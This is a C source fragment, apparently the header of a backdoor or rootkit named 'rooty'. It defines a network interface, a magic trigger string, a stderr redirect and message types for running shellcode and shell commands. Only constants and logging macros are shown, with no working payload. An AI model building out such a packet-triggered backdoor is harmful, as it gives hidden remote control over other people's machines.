#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>

#ifdef __unix__
   #include "rooty_unix.h"
#elif defined(_WIN32) || defined(WIN32)
   #include "rooty_win.h"
#endif


#define SIZE_ETHERNET   14
#define STACK_SIZE      16384
#define MAX_PACKET_SIZE 1024
#define INTERFACE		"eth0"
#define MAGIC           	"GOATSE"
#define REDIRECT		" 2>&1"

#define MESSAGE_SHELLCODE 		0x01
#define MESSAGE_COMMAND 		0x02
#define MESSAGE_REMOTE_SHELLCODE	0x03

#ifdef DEBUG
#define DEBUG_WRAP(code) code
#else
#define DEBUG_WRAP(code)
#endif


#define LOG(level, ...) { fprintf(stderr, "%s: ", level); fprintf(stderr, __VA_ARGS__); fprintf(stderr, "\n"); }
#define LOG_ERROR(...) { LOG("ERROR", __VA_ARGS__); }
#define LOG_DEBUG(...) { DEBUG_WRAP(LOG("DEBUG", __VA_ARGS__)); }
